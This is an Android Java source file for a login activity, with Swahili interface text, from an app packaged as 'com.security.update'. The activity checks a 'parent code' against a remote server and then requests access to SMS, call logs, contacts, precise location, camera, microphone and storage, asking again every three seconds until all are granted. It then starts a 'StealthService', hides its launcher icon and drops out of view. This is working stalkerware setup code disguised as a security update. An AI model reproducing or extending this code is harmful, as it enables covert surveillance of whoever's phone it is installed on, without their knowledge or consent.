package com.security.update;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.EditText;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LoginActivity extends Activity {
    private EditText codeInput;
    private Button verifyButton;
    private TextView statusText;
    private SharedPreferences prefs;
    
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final String[] REQUIRED_PERMISSIONS = {
        "android.permission.READ_SMS",
        "android.permission.READ_CALL_LOG", 
        "android.permission.READ_CONTACTS",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.CAMERA",
        "android.permission.RECORD_AUDIO",
        "android.permission.WRITE_EXTERNAL_STORAGE"
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        codeInput = findViewById(R.id.codeInput);
        verifyButton = findViewById(R.id.verifyButton);
        statusText = findViewById(R.id.statusText);

        // Check if already verified and has permissions
        if (prefs.getBoolean("verified", false) && hasAllPermissions()) {
            startStealthMode();
            return;
        }

        verifyButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String parentCode = codeInput.getText().toString().trim().toUpperCase();
                if (parentCode.length() != 8) {
                    statusText.setText("❌ Parent Code lazima iwe herufi 8!");
                    return;
                }
                verifyParentCode(parentCode);
            }
        });
    }

    private void verifyParentCode(final String parentCode) {
        statusText.setText("🔍 Inaangalia Parent Code...");
        verifyButton.setEnabled(false);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/verify-code";
                    
                    JSONObject postData = new JSONObject();
                    postData.put("parent_code", parentCode);

                    URL url = new URL(serverUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    OutputStream os = conn.getOutputStream();
                    os.write(postData.toString().getBytes());
                    os.flush();
                    os.close();

                    final int responseCode = conn.getResponseCode();
                    
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            if (responseCode == 200) {
                                // Parent Code ni sahihi
                                statusText.setText("✅ Parent Code imethibitishwa!");
                                
                                // Save parent code kwenye preferences
                                SharedPreferences.Editor editor = prefs.edit();
                                editor.putString("parent_code", parentCode);
                                editor.putBoolean("verified", true);
                                editor.apply();
                                
                                // Anza kuomba permissions zote
                                requestAllPermissions();
                                
                            } else if (responseCode == 404) {
                                statusText.setText("❌ Parent Code haipo! Ingiza code sahihi.");
                                verifyButton.setEnabled(true);
                            } else {
                                statusText.setText("❌ Hitilafu ya mtandao! Jaribu tena.");
                                verifyButton.setEnabled(true);
                            }
                        }
                    });

                } catch (Exception e) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            statusText.setText("❌ Hitilafu: " + e.getMessage());
                            verifyButton.setEnabled(true);
                        }
                    });
                }
            }
        }).start();
    }

    private void requestAllPermissions() {
        statusText.setText("🔐 Inaomba ruhusa zote muhimu...");
        
        // For Android 6.0+ (API 23+), tumia requestPermissions
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            requestPermissions(REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
        } else {
            // For older versions, proceed directly
            startStealthMode();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            
            // Check if all permissions were granted
            for (int result : grantResults) {
                if (result != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                statusText.setText("✅ Ruhusa zote zimekubaliwa!");
                startStealthMode();
            } else {
                statusText.setText("❌ Baadhi ya ruhusa hazikukubaliwa. App haitafanya kazi vizuri.");
                // Retry permission request after 3 seconds
                new android.os.Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        requestAllPermissions();
                    }
                }, 3000);
            }
        }
    }

    private boolean hasAllPermissions() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            for (String permission : REQUIRED_PERMISSIONS) {
                if (checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    private void startStealthMode() {
        statusText.setText("🚀 Inaanzisha stealth mode...");
        
        // Anza StealthService
        Intent serviceIntent = new Intent(this, StealthService.class);
        serviceIntent.putExtra("PARENT_CODE", prefs.getString("parent_code", ""));
        startService(serviceIntent);
        
        // Ondoka kwenye screen na kujificha kwenye system settings
        Toast.makeText(this, "✅ App imesanikishwa! Inajificha kwenye system settings.", Toast.LENGTH_LONG).show();
        
        // Hide app from recent apps
        moveTaskToBack(true);
        
        // Optional: Hide app launcher icon (requires component disabling)
        hideLauncherIcon();
        
        // Maliza activity ili isionekane tena
        finish();
    }

    private void hideLauncherIcon() {
        try {
            // This will hide the app from launcher but keep it in system settings
            android.content.pm.PackageManager p = getPackageManager();
            p.setComponentEnabledSetting(
                new android.content.ComponentName(this, LoginActivity.class),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            // Silent catch - icon might remain visible
        }
    }
}
